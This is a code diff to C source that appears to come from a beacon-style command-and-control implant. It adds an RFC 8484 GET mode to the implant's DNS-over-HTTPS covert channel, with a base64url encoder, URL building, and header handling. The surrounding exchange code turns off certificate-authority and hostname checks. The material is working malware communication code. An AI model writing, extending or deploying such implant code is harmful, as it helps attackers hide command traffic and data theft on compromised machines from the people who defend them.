@@ -13,7 +13,8 @@
  *   SETTING_DOH_MODE      77  short  0/1 (profile: dns-beacon.comm_mode
  *                                      "dns-over-https")
  *   SETTING_DOH_SERVER    78  string https://host[:port]/dns-query
- *   SETTING_DOH_VERB      79  string POST (GET ?dns= is not implemented)
+ *   SETTING_DOH_VERB      79  string POST (default) or GET (?dns=<base64url>,
+ *                                      RFC 8484 section 4.1)
  *   SETTING_DOH_USERAGENT 80  string
  *   SETTING_DOH_ACCEPT    81  string application/dns-message
  *
@@ -211,6 +212,41 @@ static int doh_skip_name(const unsigned char * p, const unsigned char * end) {
 
 /* --- HTTP exchange -------------------------------------------------- */
 
+/* RFC 4648 base64url, unpadded - the ?dns= parameter of RFC 8484 GETs */
+static int doh_base64url(const unsigned char * in, int inlen, char * out, int outmax) {
+	static const char T[] =
+		"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
+	int i = 0, o = 0;
+
+	if (in == NULL || out == NULL || outmax < 4)
+		return -1;
+	while (i + 2 < inlen) {
+		unsigned int v = ((unsigned int)in[i] << 16)
+		               | ((unsigned int)in[i + 1] << 8)
+		               | (unsigned int)in[i + 2];
+		if (o + 4 >= outmax)
+			return -1;
+		out[o++] = T[(v >> 18) & 63];
+		out[o++] = T[(v >> 12) & 63];
+		out[o++] = T[(v >> 6) & 63];
+		out[o++] = T[v & 63];
+		i += 3;
+	}
+	if (i < inlen) {
+		int rem = inlen - i;
+		unsigned int v = ((unsigned int)in[i] << 16)
+		               | (rem == 2 ? ((unsigned int)in[i + 1] << 8) : 0);
+		if (o + 4 >= outmax)
+			return -1;
+		out[o++] = T[(v >> 18) & 63];
+		out[o++] = T[(v >> 12) & 63];
+		if (rem == 2)
+			out[o++] = T[(v >> 6) & 63];
+	}
+	out[o] = 0;
+	return o;
+}
+
 static int doh_exchange(unsigned char * query, int qlen,
                         unsigned char * resp, int rmax) {
 	HINTERNET session = NULL, connect = NULL, request = NULL;
@@ -219,6 +255,13 @@ static int doh_exchange(unsigned char * query, int qlen,
 	char * accept = setting_ptr(SETTING_DOH_ACCEPT);
 	const char * acceptTypes[2];
 	char headers[512];
+	/* RFC 8484 GET carries the whole RFC 1035 message in ?dns=<base64url>;
+	 * 4096-byte queries expand to ~5464 chars, so the path buffer is sized
+	 * for the worst case plus the configured path/query prefix. */
+	char pathbuf[8192];
+	char b64[(DOH_MAX_PACKET / 3 + 1) * 4 + 8];
+	const char * path = doh_path;
+	int use_get = 0;
 	DWORD read = 0, total = 0;
 	DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
 	                 | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
@@ -240,6 +283,22 @@ static int doh_exchange(unsigned char * query, int qlen,
 	acceptTypes[0] = accept;
 	acceptTypes[1] = NULL;
 
+	/* GET mode: verb starts with 'G' (profile doh_verb "GET") - RFC 8484
+	 * section 4.1: the DNS message is the base64url-encoded `dns` query
+	 * parameter and the request carries no body. */
+	if (verb[0] == 'G' || verb[0] == 'g') {
+		int blen = doh_base64url(query, qlen, b64, (int)sizeof(b64));
+		if (blen <= 0) {
+			spawn_log("doh exch base64url fail", 0x7fffffff);
+			return -1;
+		}
+		_snprintf(pathbuf, sizeof(pathbuf) - 1, "%s%sdns=%s",
+		          doh_path, (strchr(doh_path, '?') != NULL) ? "&" : "?", b64);
+		path = pathbuf;
+		use_get = 1;
+		verb = "GET";
+	}
+
 	if (doh_secure)
 		flags = INTERNET_FLAG_SECURE;
 	flags |= INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE
@@ -256,7 +315,7 @@ static int doh_exchange(unsigned char * query, int qlen,
 		spawn_log("doh exch InternetConnect gle=", (long)GetLastError());
 		goto done;
 	}
-	request = WI.HttpOpenRequestA(connect, verb, doh_path, NULL, NULL,
+	request = WI.HttpOpenRequestA(connect, verb, path, NULL, NULL,
 	                               acceptTypes, flags, 0);
 	if (request == NULL) {
 		spawn_log("doh exch HttpOpenRequest gle=", (long)GetLastError());
@@ -265,11 +324,17 @@ static int doh_exchange(unsigned char * query, int qlen,
 	WI.InternetSetOptionA(request, INTERNET_OPTION_SECURITY_FLAGS,
 	                      &secFlags, sizeof(secFlags));
 
-	_snprintf(headers, sizeof(headers) - 1,
-	          "Content-Type: %s\r\nAccept: %s\r\n",
-	          accept, accept);
+	if (use_get) {
+		/* no body, no Content-Type - the message rides in the URL */
+		_snprintf(headers, sizeof(headers) - 1, "Accept: %s\r\n", accept);
+	} else {
+		_snprintf(headers, sizeof(headers) - 1,
+		          "Content-Type: %s\r\nAccept: %s\r\n",
+		          accept, accept);
+	}
 
-	if (!WI.HttpSendRequestA(request, headers, (DWORD)-1L, query, qlen)) {
+	if (!WI.HttpSendRequestA(request, headers, (DWORD)-1L,
+	                         use_get ? NULL : query, use_get ? 0 : qlen)) {
 		spawn_log("doh exch SendRequest gle=", (long)GetLastError());
 		goto done;
 	}
